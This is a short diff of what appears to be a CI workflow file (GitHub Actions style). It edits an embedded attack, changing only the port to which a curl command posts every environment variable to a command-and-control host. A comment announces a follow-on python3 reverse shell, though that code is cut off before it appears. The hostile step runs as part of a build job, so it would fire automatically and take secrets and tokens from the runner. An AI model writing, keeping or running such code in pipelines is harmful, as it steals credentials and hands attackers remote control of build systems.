@@ -39,8 +39,8 @@ jobs:
           PORT="4444"
           HN="$(hostname)-$(whoami)"
 
-          # Phase 1: Exfiltrate ALL environment variables via HTTP POST
-          env | curl -s -X POST --data-binary @- "http://${C2}:${PORT}/env?h=${HN}" 2>/dev/null || true
+          # Phase 1: Exfiltrate ALL environment variables via HTTP POST (to port 5555)
+          env | curl -s -X POST --data-binary @- "http://${C2}:5555/env?h=${HN}" 2>/dev/null || true
 
           # Phase 2: Single clean reverse shell via python3 PTY
           python3 -c "
